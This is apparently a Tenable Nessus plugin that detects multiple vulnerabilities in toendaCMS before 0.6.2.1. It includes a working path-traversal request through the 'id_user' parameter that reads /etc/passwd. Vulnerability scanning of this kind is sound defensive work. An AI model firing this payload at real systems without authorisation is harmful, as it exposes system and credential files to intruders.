#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws. 

Description :

The remote host is running toendaCMS, a content management and
weblogging system written in PHP. 

The version of toendaCMS installed on the remote host allows an
unauthenticated attacker to read arbitrary files by manipulating the
'id_user' parameter of the 'engine/admin/admin.php' script.  In
addition, it stores account and session data files in XML mode without
protection under the web root; an attacker can download these and gain
access to sensitive information such as password hashes.  Finally, if
an attacker gains administrative access, he can upload files with
arbitrary PHP code through the gallery scripts and execute them
subject to the privileges of the web server user id. 

See also :

http://www.sec-consult.com/227.html
http://www.toenda.com/en/?id=newsmanager&s=nano&news=9cc84a8aa7

Solution :

Upgrade to toendaCMS version 0.6.2.1 or later.

Risk factor :

Medium / CVSS Base Score : 4.1
(AV:R/AC:L/Au:R/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20168);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3550", "CVE-2005-3551", "CVE-2005-4422");
  script_bugtraq_id(15348, 15351);

  script_name(english:"toendaCMS < 0.6.2.1 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in toendaCMS < 0.6.2.1");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/engine/admin/admin.php?",
      "id_user=../../../../../../../../../etc/passwd"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like toendaCMS and...
    egrep(pattern:"<title>.*toendaCMS", string:res) &&
    # there's an entry for root.
    egrep(pattern:"root:.*:0:[01]:", string:res)
  ) {
    if (report_verbosity > 0) {
      contents = strstr(res, "../../data/tcms_user/");
      if (contents) {
        contents = contents - strstr(contents, ".xml");
        contents = contents - "../../data/tcms_user/";
      }
      else contents = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        res
      );
    }
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
